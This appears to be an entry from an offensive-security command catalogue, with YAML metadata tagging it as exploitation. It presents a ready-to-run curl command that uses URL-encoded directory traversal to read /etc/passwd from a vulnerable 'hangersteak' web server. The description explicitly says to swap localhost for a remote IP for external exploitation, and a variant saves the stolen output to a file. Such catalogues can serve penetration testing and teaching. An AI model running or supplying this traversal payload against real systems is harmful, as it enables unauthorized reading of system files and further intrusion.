---
id: cmd-curl-traversal-001
data: >-
  curl
  "http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
tags:
  - exploitation
  - traversal
type: command
output: Content of /etc/passwd file
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:05.498Z'
verified: false
validated: true
submitted: true
---
# curl-directory-traversal

## Command

```bash
curl "http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

## Description

Sends a GET request to the vulnerable hangersteak server with URL-encoded path traversal to read /etc/passwd. Replace localhost with remote IP for external exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `URL` | http://localhost:3006/ with encoded path to /etc/passwd | Yes |

## Examples

### Basic Usage

```bash
curl "http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

### Advanced Usage

```bash
curl -v "http://target:3006/%2e%2e%2fetc%2fpasswd" > output.txt
```

## Expected Output

Raw contents of /etc/passwd, listing user accounts and shells.

## Related

- [[Related Procedure|procedures/Exploit-Directory-Traversal-with-Curl]]
